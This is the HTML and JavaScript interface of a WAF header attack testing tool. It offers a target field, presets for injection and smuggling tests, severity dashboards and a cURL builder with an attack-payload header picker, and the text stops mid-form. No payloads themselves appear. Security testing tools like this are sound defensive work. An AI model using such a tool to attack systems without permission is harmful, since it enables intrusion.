<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAF Header Attack Testing Suite | Professional Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        .tech-gradient {
            background: linear-gradient(135deg, #0ea5e9 0%, #06b6d4 100%);
        }
        
        .card-hover {
            transition: all 0.2s ease;
            border: 1px solid #e5e7eb;
        }
        
        .card-hover:hover {
            border-color: #06b6d4;
            box-shadow: 0 4px 12px rgba(6, 182, 212, 0.15);
            transform: translateY(-2px);
        }
        
        .test-selected {
            background-color: #f0fdfa;
            border-color: #06b6d4;
        }
        
        .code-output {
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            background: #0f172a;
            color: #e2e8f0;
            line-height: 1.6;
            font-size: 13px;
        }
        
        .severity-critical { color: #dc2626; background: #fee2e2; }
        .severity-high { color: #ea580c; background: #fed7aa; }
        .severity-medium { color: #ca8a04; background: #fef3c7; }
        .severity-low { color: #0891b2; background: #e0f2fe; }
        
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #f1f5f9; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
    </style>
</head>
<body class="bg-gray-50 text-gray-900">
    <!-- Header -->
    <header class="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <div class="flex items-center">
                    <i class="fas fa-shield-alt text-2xl text-cyan-600 mr-3"></i>
                    <div>
                        <h1 class="text-xl font-semibold">WAF Header Attack Testing Suite</h1>
                        <p class="text-xs text-gray-500">Comprehensive Header Attack Testing</p>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <div class="text-right">
                        <p class="text-sm text-gray-600">Selected: <span id="selectedCount" class="font-semibold text-cyan-600">0</span></p>
                        <p class="text-xs text-gray-500">Total: <span id="totalCount">0</span> tests</p>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Quick Actions -->
    <div class="bg-white border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
            <div class="flex flex-wrap gap-2">
                <button onclick="selectPreset('critical')" class="px-3 py-1.5 bg-red-50 text-red-700 rounded-md hover:bg-red-100 transition text-sm font-medium">
                    Critical Only
                </button>
                <button onclick="selectPreset('injection')" class="px-3 py-1.5 bg-orange-50 text-orange-700 rounded-md hover:bg-orange-100 transition text-sm font-medium">
                    Injection Attacks
                </button>
                <button onclick="selectPreset('smuggling')" class="px-3 py-1.5 bg-yellow-50 text-yellow-700 rounded-md hover:bg-yellow-100 transition text-sm font-medium">
                    Smuggling Tests
                </button>
                <button onclick="selectPreset('all')" class="px-3 py-1.5 bg-green-50 text-green-700 rounded-md hover:bg-green-100 transition text-sm font-medium">
                    All Tests
                </button>
                <button onclick="clearAll()" class="px-3 py-1.5 bg-gray-50 text-gray-700 rounded-md hover:bg-gray-100 transition text-sm font-medium">
                    Clear All
                </button>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        <!-- Configuration -->
        <div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-6">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Target URL</label>
                    <input type="text" id="targetUrl" value="http://target.com" 
                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Proxy (Optional)</label>
                    <input type="text" id="proxyUrl" placeholder="http://127.0.0.1:8080" 
                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                </div>
            </div>
        </div>











<!-- Place this right after your search and filter section -->
<!-- Category Cards Section -->
<div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-6">
    <div class="flex justify-between items-center mb-4">
        <h3 class="text-lg font-semibold">Attack Categories</h3>
        <div class="text-sm text-gray-500">Click a card to navigate to category</div>
    </div>
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4" id="categoryCards">
        <!-- Category cards will be generated here -->
    </div>
</div>

<script>// Simple function to generate category cards
function generateCategoryCards() {
    const categoryCardsContainer = document.getElementById('categoryCards');
    if (!categoryCardsContainer) return;
    
    categoryCardsContainer.innerHTML = '';
    
    Object.keys(testDatabase).forEach(categoryName => {
        const category = testDatabase[categoryName];
        const tests = category.tests;
        
        const card = document.createElement('div');
        card.className = 'border border-gray-200 rounded-lg p-4 hover:shadow-md transition cursor-pointer bg-white';
        card.innerHTML = `
            <h4 class="font-semibold text-gray-800 flex items-center mb-2">
                <i class="fas ${category.icon} text-cyan-600 mr-2"></i>
                ${categoryName}
            </h4>
            <div class="text-sm text-gray-600 mb-2">${tests.length} tests</div>
            <button class="w-full text-xs bg-cyan-50 text-cyan-700 hover:bg-cyan-100 px-2 py-1 rounded-md">
                View Tests
            </button>
        `;
        
        // Add click event to navigate to category
        card.addEventListener('click', function() {
            const categoryElement = document.querySelector(`div[data-category="${categoryName}"]`);
            if (categoryElement) {
                categoryElement.scrollIntoView({ behavior: 'smooth' });
            }
        });
        
        categoryCardsContainer.appendChild(card);
    });
}

// Add this to your existing init function or document ready event
document.addEventListener('DOMContentLoaded', function() {
    // Call this after your existing initialization
    setTimeout(generateCategoryCards, 100);
});</script>



<!-- Category Cards Section -->
<div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-6">
    <div class="flex justify-between items-center mb-4">
        <h3 class="text-lg font-semibold">Attack Categories</h3>
        <div class="text-sm text-gray-500">Click a card to navigate to category</div>
    </div>
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4" id="categoryCards">
        <!-- Category cards will be generated here -->
    </div>
</div>

<!-- Statistics Dashboard -->
<div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 p-6">
    <div class="flex justify-between items-center mb-4">
        <h3 class="text-lg font-semibold">Attack Statistics</h3>
        <div class="flex space-x-2">
            <span class="px-2 py-1 bg-gray-100 text-gray-800 rounded-md text-xs font-medium" id="statsSelectedCount">0 Selected</span>
            <span class="px-2 py-1 bg-gray-100 text-gray-800 rounded-md text-xs font-medium" id="statsTotalCount">0 Total</span>
        </div>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
        <!-- Severity Distribution -->
        <div class="border border-gray-200 rounded-lg p-4 shadow-sm">
            <h4 class="text-sm font-semibold text-gray-700 mb-3">Severity Distribution</h4>
            <div class="grid grid-cols-2 gap-3 mb-4" id="severityStats">
                <!-- Severity stats will be generated here -->
            </div>
            <!-- Severity Bar -->
            <div class="mt-3">
                <div class="h-2 bg-gray-200 rounded-full overflow-hidden">
                    <div class="flex h-full">
                        <div class="bg-red-500 h-full" id="criticalBar"></div>
                        <div class="bg-orange-500 h-full" id="highBar"></div>
                        <div class="bg-yellow-500 h-full" id="mediumBar"></div>
                        <div class="bg-blue-500 h-full" id="lowBar"></div>
                    </div>
                </div>
                <div class="flex justify-between text-xs text-gray-500 mt-1">
                    <span>Critical</span>
                    <span>High</span>
                    <span>Medium</span>
                    <span>Low</span>
                </div>
            </div>
        </div>
        
        <!-- Top Categories -->
        <div class="border border-gray-200 rounded-lg p-4 shadow-sm">
            <h4 class="text-sm font-semibold text-gray-700 mb-3">Top Attack Vectors</h4>
            <div id="categoryStats" class="space-y-3">
                <!-- Category stats will be generated here -->
            </div>
        </div>
    </div>
</div>


<script>// Generate category cards with improved design
function generateCategoryCards() {
    const categoryCardsContainer = document.getElementById('categoryCards');
    if (!categoryCardsContainer) return;
    
    categoryCardsContainer.innerHTML = '';
    
    Object.keys(testDatabase).forEach(categoryName => {
        const category = testDatabase[categoryName];
        const tests = category.tests;
        
        // Count tests by severity
        const severityCounts = {
            critical: tests.filter(t => t.severity === 'critical').length,
            high: tests.filter(t => t.severity === 'high').length,
            medium: tests.filter(t => t.severity === 'medium').length,
            low: tests.filter(t => t.severity === 'low').length
        };
        
        // Get the highest severity for card highlighting
        let cardClass = 'border-gray-200';
        if (severityCounts.critical > 0) cardClass = 'border-red-200';
        else if (severityCounts.high > 0) cardClass = 'border-orange-200';
        else if (severityCounts.medium > 0) cardClass = 'border-yellow-200';
        
        const card = document.createElement('div');
        card.className = `border ${cardClass} rounded-lg p-4 hover:shadow-md transition cursor-pointer bg-white relative overflow-hidden`;
        card.dataset.category = categoryName;
        
        // Add a subtle background pattern for visual interest
        const pattern = document.createElement('div');
        pattern.className = 'absolute top-0 right-0 w-24 h-24 opacity-5';
        pattern.innerHTML = `<i class="fas ${category.icon} text-6xl transform rotate-12 translate-x-6 -translate-y-2"></i>`;
        card.appendChild(pattern);
        
        const contentDiv = document.createElement('div');
        contentDiv.className = 'relative z-10'; // Make sure content is above the pattern
        contentDiv.innerHTML = `
            <div class="flex justify-between items-start mb-3">
                <h4 class="font-semibold text-gray-800 flex items-center">
                    <i class="fas ${category.icon} text-cyan-600 mr-2"></i>
                    <span class="truncate max-w-[150px]" title="${categoryName}">${categoryName}</span>
                </h4>
            </div>
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm text-gray-600">${tests.length} tests</span>
                <button class="category-toggle text-xs bg-cyan-50 text-cyan-700 hover:bg-cyan-100 px-2 py-1 rounded-md shadow-sm" 
                        onclick="toggleCategory('${categoryName}', event)">
                    Select All
                </button>
            </div>
            <div class="flex flex-wrap gap-1.5">
                ${severityCounts.critical ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-red-100 text-red-700 flex items-center"><i class="fas fa-exclamation-circle mr-1 text-red-600"></i>${severityCounts.critical}</span>` : ''}
                ${severityCounts.high ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-orange-100 text-orange-700 flex items-center"><i class="fas fa-exclamation-triangle mr-1 text-orange-600"></i>${severityCounts.high}</span>` : ''}
                ${severityCounts.medium ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-yellow-100 text-yellow-700 flex items-center"><i class="fas fa-exclamation mr-1 text-yellow-600"></i>${severityCounts.medium}</span>` : ''}
                ${severityCounts.low ? `<span class="px-1.5 py-0.5 rounded-full text-xs bg-blue-100 text-blue-700 flex items-center"><i class="fas fa-info-circle mr-1 text-blue-600"></i>${severityCounts.low}</span>` : ''}
            </div>
            <div class="mt-3 h-1 bg-gray-200 rounded-full overflow-hidden">
                <div class="flex h-full">
                    <div class="bg-red-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.critical / tests.length) * 100 : 0}%"></div>
                    <div class="bg-orange-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.high / tests.length) * 100 : 0}%"></div>
                    <div class="bg-yellow-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.medium / tests.length) * 100 : 0}%"></div>
                    <div class="bg-blue-500 h-full" style="width: ${tests.length > 0 ? (severityCounts.low / tests.length) * 100 : 0}%"></div>
                </div>
            </div>
        `;
        card.appendChild(contentDiv);
        
        // Add click event to navigate to category
        card.addEventListener('click', function(e) {
            // Don't navigate if clicking on the toggle button
            if (e.target.closest('.category-toggle')) return;
            
            const categoryElement = document.querySelector(`div[data-category="${categoryName}"]:not([id="categoryCards"] div)`);
            if (categoryElement) {
                categoryElement.scrollIntoView({ behavior: 'smooth' });
                
                // Highlight the category briefly
                categoryElement.classList.add('bg-cyan-50');
                setTimeout(() => {
                    categoryElement.classList.remove('bg-cyan-50');
                }, 1500);
            }
        });
        
        categoryCardsContainer.appendChild(card);
    });
}

// Toggle all tests in a category
function toggleCategory(categoryName, event) {
    event.stopPropagation();
    
    const button = event.target.closest('.category-toggle');
    const isSelecting = button.textContent.trim() === 'Select All';
    
    // Find all test items in this category
    const categoryTests = document.querySelectorAll(`.test-item[data-category="${categoryName}"]`);
    
    categoryTests.forEach(item => {
        const checkbox = item.querySelector('.test-checkbox');
        checkbox.checked = isSelecting;
        item.classList.toggle('test-selected', isSelecting);
    });
    
    // Update button text and styling for all buttons with this category
    document.querySelectorAll(`.category-toggle`).forEach(btn => {
        if (btn.closest('[data-category]')?.dataset.category === categoryName) {
            btn.textContent = isSelecting ? 'Deselect All' : 'Select All';
            btn.classList.toggle('bg-cyan-50', !isSelecting);
            btn.classList.toggle('text-cyan-700', !isSelecting);
            btn.classList.toggle('bg-gray-100', isSelecting);
            btn.classList.toggle('text-gray-700', isSelecting);
        }
    });
    
    updateCounts();
    updateStatistics();
}

// Update test statistics with enhanced visuals
function updateStatistics() {
    // Get all tests
    const allTests = [];
    Object.keys(testDatabase).forEach(categoryName => {
        testDatabase[categoryName].tests.forEach(test => {
            allTests.push({
                category: categoryName,
                ...test
            });
        });
    });
    
    // Count by severity
    const severityCounts = {
        critical: allTests.filter(t => t.severity === 'critical').length,
        high: allTests.filter(t => t.severity === 'high').length,
        medium: allTests.filter(t => t.severity === 'medium').length,
        low: allTests.filter(t => t.severity === 'low').length
    };
    
    const totalTests = allTests.length;
    
    // Count selected tests
    const selectedTests = Array.from(document.querySelectorAll('.test-checkbox:checked')).length;
    
    // Update the selected/total counters
    document.getElementById('statsSelectedCount').textContent = `${selectedTests} Selected`;
    document.getElementById('statsTotalCount').textContent = `${totalTests} Total`;
    
    // Update severity stats
    const severityStatsDiv = document.getElementById('severityStats');
    if (severityStatsDiv) {
        severityStatsDiv.innerHTML = `
            <div class="bg-red-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-red-800 font-medium">Critical</span>
                    <span class="bg-red-100 text-red-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.critical}</span>
                </div>
                <div class="text-xs text-red-600 mt-1">${Math.round((severityCounts.critical / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-red-700 flex items-center">
                    <i class="fas fa-exclamation-circle mr-1"></i> Immediate action needed
                </div>
            </div>
            
            <div class="bg-orange-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-orange-800 font-medium">High</span>
                    <span class="bg-orange-100 text-orange-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.high}</span>
                </div>
                <div class="text-xs text-orange-600 mt-1">${Math.round((severityCounts.high / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-orange-700 flex items-center">
                    <i class="fas fa-exclamation-triangle mr-1"></i> High priority fixes
                </div>
            </div>
            
            <div class="bg-yellow-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-yellow-800 font-medium">Medium</span>
                    <span class="bg-yellow-100 text-yellow-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.medium}</span>
                </div>
                <div class="text-xs text-yellow-600 mt-1">${Math.round((severityCounts.medium / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-yellow-700 flex items-center">
                    <i class="fas fa-exclamation mr-1"></i> Moderate risk
                </div>
            </div>
            
            <div class="bg-blue-50 rounded-lg p-3 flex flex-col">
                <div class="flex justify-between items-center">
                    <span class="text-blue-800 font-medium">Low</span>
                    <span class="bg-blue-100 text-blue-800 px-2 py-0.5 rounded-full font-bold">${severityCounts.low}</span>
                </div>
                <div class="text-xs text-blue-600 mt-1">${Math.round((severityCounts.low / totalTests) * 100)}% of tests</div>
                <div class="mt-2 text-xs text-blue-700 flex items-center">
                    <i class="fas fa-info-circle mr-1"></i> Low priority
                </div>
            </div>
        `;
    }
    
    // Update severity bars
    if (document.getElementById('criticalBar')) {
        document.getElementById('criticalBar').style.width = `${(severityCounts.critical / totalTests) * 100}%`;
        document.getElementById('highBar').style.width = `${(severityCounts.high / totalTests) * 100}%`;
        document.getElementById('mediumBar').style.width = `${(severityCounts.medium / totalTests) * 100}%`;
        document.getElementById('lowBar').style.width = `${(severityCounts.low / totalTests) * 100}%`;
    }
    
    // Count by category
    const categoryCounts = {};
    allTests.forEach(test => {
        if (!categoryCounts[test.category]) {
            categoryCounts[test.category] = 0;
        }
        categoryCounts[test.category]++;
    });
    
    // Sort categories by test count
    const sortedCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5); // Top 5 categories
    
    // Update category stats
    const categoryStatsDiv = document.getElementById('categoryStats');
    if (categoryStatsDiv) {
        categoryStatsDiv.innerHTML = '';
        
        sortedCategories.forEach(([category, count], index) => {
            const percentage = (count / totalTests) * 100;
            const colors = [
                'bg-cyan-500', 'bg-purple-500', 'bg-green-500', 
                'bg-indigo-500', 'bg-pink-500', 'bg-teal-500'
            ];
            const color = colors[index % colors.length];
            
            const div = document.createElement('div');
            div.className = 'bg-gray-50 rounded-lg p-3';
            div.innerHTML = `
                <div class="flex justify-between items-center mb-1">
                    <span class="text-sm font-medium text-gray-700">${category}</span>
                    <span class="text-sm text-gray-500">${count} tests</span>
                </div>
                <div class="h-2 bg-gray-200 rounded-full overflow-hidden">
                    <div class="${color} h-full" style="width: ${percentage}%"></div>
                </div>
                <div class="mt-1 flex justify-between">
                    <span class="text-xs text-gray-500">${percentage.toFixed(1)}% of all tests</span>
                    <span class="text-xs text-gray-500 cursor-pointer hover:text-cyan-600" 
                          onclick="scrollToCategory('${category}')">
                        <i class="fas fa-arrow-right"></i> View
                    </span>
                </div>
            `;
            categoryStatsDiv.appendChild(div);
        });
    }
}

// Function to scroll to a category when clicking "View"
function scrollToCategory(categoryName) {
    const categoryElement = document.querySelector(`div[data-category="${categoryName}"]:not([id="categoryCards"] div)`);
    if (categoryElement) {
        categoryElement.scrollIntoView({ behavior: 'smooth' });
        
        // Highlight the category briefly
        categoryElement.classList.add('bg-cyan-50');
        setTimeout(() => {
            categoryElement.classList.remove('bg-cyan-50');
        }, 1500);
    }
}

// Add to your existing init function or create a new one
function init() {
    renderTests();
    generateCategoryCards();
    updateCounts();
    updateStatistics();
}

// Update the updateCounts function to also update statistics
function updateCounts() {
    const total = document.querySelectorAll('.test-checkbox').length;
    const selected = document.querySelectorAll('.test-checkbox:checked').length;
    
    document.getElementById('totalCount').textContent = total;
    document.getElementById('selectedCount').textContent = selected;
    document.getElementById('selectedBadge').textContent = selected;
    
    updateStatistics();
}

// Make sure this is called when the document is ready
document.addEventListener('DOMContentLoaded', function() {
    // If you have an existing init function, call it first
    // Alternatively, call our init function
    setTimeout(init, 100);
});</script>





<!-- Enhanced cURL Payload Builder Section -->
<div class="bg-white rounded-lg shadow-sm border border-gray-200 mb-6 overflow-hidden">
    <!-- Toggle Header -->
    <div class="bg-gradient-to-r from-cyan-50 to-blue-50 p-4 border-b border-gray-200 cursor-pointer" id="curlBuilderToggle">
        <div class="flex justify-between items-center">
            <h3 class="text-lg font-semibold flex items-center">
                <i class="fas fa-terminal text-cyan-600 mr-2"></i>
                Enhanced cURL Command Builder
                <span class="ml-2 text-xs px-2 py-0.5 bg-cyan-100 text-cyan-800 rounded-full">Pro</span>
            </h3>
            <button class="bg-cyan-100 hover:bg-cyan-200 text-cyan-700 p-2 rounded-lg transition">
                <i class="fas fa-chevron-down" id="curlBuilderIcon"></i>
            </button>
        </div>
    </div>
    
    <!-- Builder Content (Initially Hidden) -->
    <div class="p-6 hidden" id="curlBuilderContent">
        <!-- Quick Templates -->
        <div class="mb-6">
            <h4 class="text-sm font-semibold text-gray-700 mb-3">Quick Templates</h4>
            <div class="flex flex-wrap gap-2">
                <button class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm template-btn" data-template="basic">
                    <i class="fas fa-file-alt mr-1"></i> Basic Request
                </button>
                <button class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm template-btn" data-template="json">
                    <i class="fas fa-code mr-1"></i> JSON API
                </button>
                <button class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm template-btn" data-template="auth">
                    <i class="fas fa-lock mr-1"></i> Authentication
                </button>
                <button class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm template-btn" data-template="multipart">
                    <i class="fas fa-file-upload mr-1"></i> File Upload
                </button>
                <button class="px-3 py-1.5 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-sm template-btn" data-template="headers">
                    <i class="fas fa-list mr-1"></i> Custom Headers
                </button>
            </div>
        </div>
        
        <!-- Tabs Navigation -->
        <div class="border-b border-gray-200 mb-6">
            <nav class="flex -mb-px">
                <button class="curl-tab-btn text-cyan-600 border-cyan-600 py-2 px-4 border-b-2 font-medium text-sm" data-tab="basic">
                    Basic
                </button>
                <button class="curl-tab-btn text-gray-500 hover:text-gray-700 py-2 px-4 border-b-2 border-transparent font-medium text-sm" data-tab="headers">
                    Headers
                </button>
                <button class="curl-tab-btn text-gray-500 hover:text-gray-700 py-2 px-4 border-b-2 border-transparent font-medium text-sm" data-tab="auth">
                    Authentication
                </button>
                <button class="curl-tab-btn text-gray-500 hover:text-gray-700 py-2 px-4 border-b-2 border-transparent font-medium text-sm" data-tab="data">
                    Data
                </button>
                <button class="curl-tab-btn text-gray-500 hover:text-gray-700 py-2 px-4 border-b-2 border-transparent font-medium text-sm" data-tab="advanced">
                    Advanced
                </button>
            </nav>
        </div>
        
        <!-- Tab Content -->
        <div class="curl-tab-content" id="curlBasicTab">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">HTTP Method</label>
                        <select id="curlMethod" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            <option value="GET">GET</option>
                            <option value="POST">POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                            <option value="PATCH">PATCH</option>
                            <option value="HEAD">HEAD</option>
                            <option value="OPTIONS">OPTIONS</option>
                            <option value="TRACE">TRACE</option>
                            <option value="CONNECT">CONNECT</option>
                        </select>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Target URL</label>
                        <input type="text" id="curlUrl" placeholder="https://example.com" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">User Agent</label>
                        <select id="curlUserAgent" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            <option value="">Default</option>
                            <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36">Chrome Windows</option>
                            <option value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15">Safari Mac</option>
                            <option value="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1">iPhone</option>
                            <option value="Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36">Android</option>
                            <option value="curl/7.68.0">curl Default</option>
                            <option value="custom">Custom...</option>
                        </select>
                        <input type="text" id="curlCustomUserAgent" placeholder="Custom User-Agent string" 
                               class="mt-2 w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 hidden">
                    </div>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Proxy</label>
                        <input type="text" id="curlProxy" placeholder="http://127.0.0.1:8080" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Basic Options</label>
                        <div class="grid grid-cols-2 gap-2">
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlVerbose" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Verbose (-v)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlInsecure" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Insecure (-k)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlHeaders" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Include Headers (-i)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlFollowRedirects" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Follow Redirects (-L)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlSilent" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Silent (-s)</span>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="checkbox" id="curlShowError" class="rounded text-cyan-600 focus:ring-cyan-500">
                                <span class="ml-2 text-sm">Show Error (-S)</span>
                            </label>
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Timeout (seconds)</label>
                        <input type="number" id="curlTimeout" min="1" max="3600" placeholder="30" 
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                    </div>
                </div>
            </div>
        </div>
        
        <div class="curl-tab-content hidden" id="curlHeadersTab">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Common Headers</label>
                        <div class="space-y-3">
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Content-Type</label>
                                <select id="curlContentType" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                                    <option value="">None</option>
                                    <option value="application/json">application/json</option>
                                    <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded</option>
                                    <option value="multipart/form-data">multipart/form-data</option>
                                    <option value="text/plain">text/plain</option>
                                    <option value="text/html">text/html</option>
                                    <option value="application/xml">application/xml</option>
                                    <option value="custom">Custom...</option>
                                </select>
                                <input type="text" id="curlCustomContentType" placeholder="Custom Content-Type" 
                                       class="mt-2 w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 hidden">
                            </div>
                            
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Accept</label>
                                <select id="curlAccept" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                                    <option value="">None</option>
                                    <option value="*/*">*/* (Any)</option>
                                    <option value="application/json">application/json</option>
                                    <option value="text/html">text/html</option>
                                    <option value="application/xml">application/xml</option>
                                    <option value="custom">Custom...</option>
                                </select>
                                <input type="text" id="curlCustomAccept" placeholder="Custom Accept" 
                                       class="mt-2 w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 hidden">
                            </div>
                            
                            <div>
                                <label class="block text-sm text-gray-600 mb-1">Cache-Control</label>
                                <select id="curlCacheControl" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                                    <option value="">None</option>
                                    <option value="no-cache">no-cache</option>
                                    <option value="no-store">no-store</option>
                                    <option value="max-age=0">max-age=0</option>
                                    <option value="custom">Custom...</option>
                                </select>
                                <input type="text" id="curlCustomCacheControl" placeholder="Custom Cache-Control" 
                                       class="mt-2 w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 hidden">
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <div class="flex justify-between items-center mb-1">
                            <label class="block text-sm font-medium text-gray-700">Custom Headers</label>
                            <button type="button" id="addCustomHeader" 
                                    class="px-2 py-1 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition text-xs flex items-center">
                                <i class="fas fa-plus mr-1"></i> Add Header
                            </button>
                        </div>
                        <div id="curlCustomHeaders" class="space-y-2 max-h-56 overflow-y-auto pr-1">
                            <!-- Header rows will be added here -->
                        </div>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Attack Payload Headers</label>
                        <select id="curlAttackCategory" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 mb-2">
                            <option value="">Select category...</option>
                            <!-- Categories will be populated dynamically -->
                        </select>
                        <select id="curlAttackHeaders" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500">
                            <option value="">Select attack payload...</option>
                            <!-- Payloads will be populated dynamically -->
                        </select>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="curl-tab-content hidden" id="curlAuthTab">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-4">
                    <div>
